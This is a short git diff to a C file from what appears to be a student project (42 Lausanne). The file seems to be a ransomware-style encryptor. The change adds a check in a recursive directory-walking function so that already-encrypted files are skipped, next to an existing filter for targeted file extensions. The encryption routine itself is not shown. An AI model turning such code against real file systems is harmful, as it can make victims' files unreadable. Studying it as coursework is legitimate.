@@ -6,7 +6,7 @@
 /*   By: hoannguy <hoannguy@student.42lausanne.c    +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2026/06/18 23:26:24 by hoannguy          #+#    #+#             */
-/*   Updated: 2026/06/28 16:37:26 by hoannguy         ###   ########.fr       */
+/*   Updated: 2026/06/28 17:24:03 by hoannguy         ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -65,6 +65,11 @@ void spread(DIR *dir, char *base_path, bool s_flag, unsigned char *key) {
 			spread(sub_dir, path, s_flag, key);
 			closedir(sub_dir);
 		} else {
+			if (is_encrypted(dp->d_name)) {
+				if (!s_flag)
+					printf("[Skip\t\t] %s\n", path);
+				continue;
+			}
 			if (!is_affected_extension(dp->d_name)) {
 				if (!s_flag)
 					printf("[Skip\t\t] %s\n", path);
